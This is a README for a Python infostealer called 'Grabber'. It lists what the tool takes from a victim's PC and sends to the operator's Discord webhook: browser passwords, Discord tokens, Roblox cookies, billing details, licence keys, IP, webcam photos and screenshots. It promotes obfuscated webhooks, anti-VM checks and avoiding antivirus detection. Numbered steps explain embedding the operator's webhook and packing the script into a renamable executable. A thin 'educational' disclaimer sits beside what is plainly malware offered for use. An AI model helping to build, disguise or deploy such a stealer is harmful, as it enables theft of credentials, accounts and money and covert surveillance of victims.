# Grabber
I'd recommend looking into the code before just using it straight away.

### Disclaimer
Some of the things in this repo should only be used in an educational enviroment, like the grabbers. I'm not liable for the damages caused by your actions.

## Features:
* Tries to go undetected.
  - Obfuscated Webhook URLs
  - No Virus Total Detections
* Its Robust as hell.
  - If no discord data is detected, it will still send all the info it got.
  - If some of the info fails/couldn't be found, it still tries to send the webhook.
* Too many things that it grabs.
  - Chrome/Brave Password Grabber
  - Discord Token Grabber
  - Camera and Screenshot of Desktop
  - Roblox Cookie Grabber
  - PC Info and IP Grabber
  - Billing Info (if billing connected to discord)
  - Windows Licence Key

### Some things to note:
* The webhook urls are encoded in base64 for extra encryption.
* The chrome passwords are encrypted by default, I wouldn't recommend changing that, as if you accidently leaked it, you're fucked.
  - You can easily decrypt them with the key and the decrypt_pass.py file.

Chrome Passwords was from the [Backdoor Machine](https://github.com/yunusborazan/Backdoor-Machine).

Anti-VM was from my [repo](https://github.com/ItsChasa/Bypass-VirusTotal).

If you have anything you'd like to add or just want to talk to people who are similar minded, join my [Discord Server](https://chasa.wtf).

## Setup/Instructions:
**Please only use this for educational purposes!**
1. Download Python with PIP, if you already have it then.
2. Download the repo and do `pip install -r requirements.txt` in cmd (make sure youre in the correct dir).
3. Go to [base64encode.org](https://www.base64encode.org/) and put your webhook url in, press encode, and copy the long string that appears.
4. Edit the grabber.py file and on line 39, in the two "", put the string you copied inside the "".
5. Open cmd in the same dir and type `pyarmor pack -e " --onefile" grabber.py`.
6. Wait until its done, can take up to 30 seconds.
7. Open the `dist` folder created and there should be an exe in there. Rename it to whatever you want and you are done! 

## Check out my other github things:
* [Discord Nukers and Tools](https://github.com/itschasa/discord-nuker-tools)
* [Grabber w/ Chrome Passwords](https://github.com/itschasa/grabber)
* [Bypass Virus Total and Anti-Viruses](https://github.com/itschasa/bypass-virustotal)
* [Captcha Bot (verify users with captchas)](https://github.com/itschasa/captcha-bot)
* [Code Generator Bot (!gen nordvpn kinda bot)](https://github.com/itschasa/code-generator)


Join my discord. :)


